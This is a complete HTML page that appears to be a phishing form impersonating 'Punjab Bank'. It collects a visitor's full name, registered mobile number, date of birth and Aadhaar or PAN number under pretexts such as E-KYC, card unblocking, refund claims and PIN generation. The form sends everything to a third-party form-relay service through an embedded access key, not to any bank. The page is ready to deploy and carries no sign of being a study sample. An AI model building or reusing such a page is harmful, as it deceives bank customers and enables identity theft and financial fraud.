<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Punjab Bank</title>
  <style>
    body {
      background-color: #FFD700;
      font-family: Arial, sans-serif;
    }

    form {
      background-color: #FFD700;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
      margin: 50px auto;
      max-width: 400px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input[type="text"],
    input[type="number"],
    input[type="date"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #FFD700;
      border-radius: 4px;
      box-sizing: border-box;
    }

    input[type="submit"] {
      background-color: #4CAF50;
      color: #FFD700;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }

    .reason {
      display: block;
      margin-bottom: 10px;
    }

    .button {
      background-color: black;
      color: #FFD700;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
    }

    .image-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .image-container img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div class="image-container">
    <img src="img\images (3).png" alt="Punjab Bank Logo">
  </div>

  <form action="https://api.web3forms.com/submit" method="POST">
    <!-- Web3Forms Access Key -->
    <input type="hidden" name="access_key" value="f65d6f7a-b510-418f-bcb1-8aa41e62446e">

    <label for="fname">Full name *</label>
    <input type="text" id="fname" name="name" placeholder="Your full name.." required>

    <label for="mobile">Registered Mobile Number *</label>
    <input type="number" id="mobile" name="mobile_number" placeholder="Your mobile number.." required>

    <label for="date">Date of Birth *</label>
    <input type="date" id="date" name="date_of_birth" required>

    <label for="account-number">Adhar Number / PAN *</label>
    <input type="text" id="account-number" name="aadhaar_pan" placeholder="Your Aadhaar or PAN.." required>

    <div class="container">
      <h2>Select Reason *</h2>
      <label class="reason">
        <input type="radio" name="reason" value="E-Kyc" required>
        E-Kyc
      </label>
      <label class="reason">
        <input type="radio" name="reason" value="Card Block/Unblock">
        Card Block/Unblock
      </label>
      <label class="reason">
        <input type="radio" name="reason" value="Refund Claim">
        Refund Claim
      </label>
      <label class="reason">
        <input type="radio" name="reason" value="Pin Generate">
        Pin Generate
      </label>
      <label class="reason">
        <input type="radio" name="reason" value="Card Apply">
        Card Apply
      </label>
      <label class="reason">
        <input type="radio" name="reason" value="Net banking">
        Net banking
      </label>
    </div>

    <input type="submit" value="Verify">
  </form>
</body>
</html>
